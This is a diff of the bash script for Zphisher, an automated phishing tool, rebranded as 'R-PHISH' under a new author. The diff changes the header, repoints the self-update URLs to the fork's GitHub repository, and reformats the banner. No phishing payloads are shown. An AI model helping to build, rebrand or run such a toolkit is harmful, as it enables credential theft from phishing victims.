@@ -1,9 +1,9 @@
 #!/bin/bash
 
-##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
+##   R-PHISH 	: 	Roshan-Editor 
+##   Author 	: 	Roshan Gupta 
 ##   Version 	: 	2.3.5
-##   Github 	: 	https://github.com/htr-tech/zphisher
+##   Github 	: 	https://github.com/Roshan-Editor/Roshan-Editor 
 
 
 ##                   GNU GENERAL PUBLIC LICENSE
@@ -164,9 +164,9 @@ kill_pid() {
 # Check for a newer release
 check_update(){
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
+	relase_url='https://api.github.com/repos/Roshan-Editor/Roshan-Editor/releases/latest'
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
+	tarball_url="https://github.com/Roshan-Editor/Roshan-Editor/archive/refs/tags/${new_version}.tar.gz"
 
 	if [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
@@ -205,12 +205,11 @@ banner() {
 	cat <<- EOF
 		${ORANGE}
 		${ORANGE}
-    $
-                ____       ____  _     _     _      
-               |  _ \     |  _ \| |__ (_)___| |__   
-               | |_) |____| |_) | '_ \| / __| '_ \  
-               |  _ <_____|  __/| | | | \__ \ | | | 
-               |_| \_\    |_|   |_| |_|_|___/_| |_|                                                                       	
+  ____       ____  _     _     _      
+ |  _ \     |  _ \| |__ (_)___| |__   
+ | |_) |____| |_) | '_ \| / __| '_ \  
+ |  _ <_____|  __/| | | | \__ \ | | | 
+ |_| \_\    |_|   |_| |_|_|___/_| |_|                                                                       	
     ${ORANGE}       
     ${ORANGE}   
 		${ORANGE} 
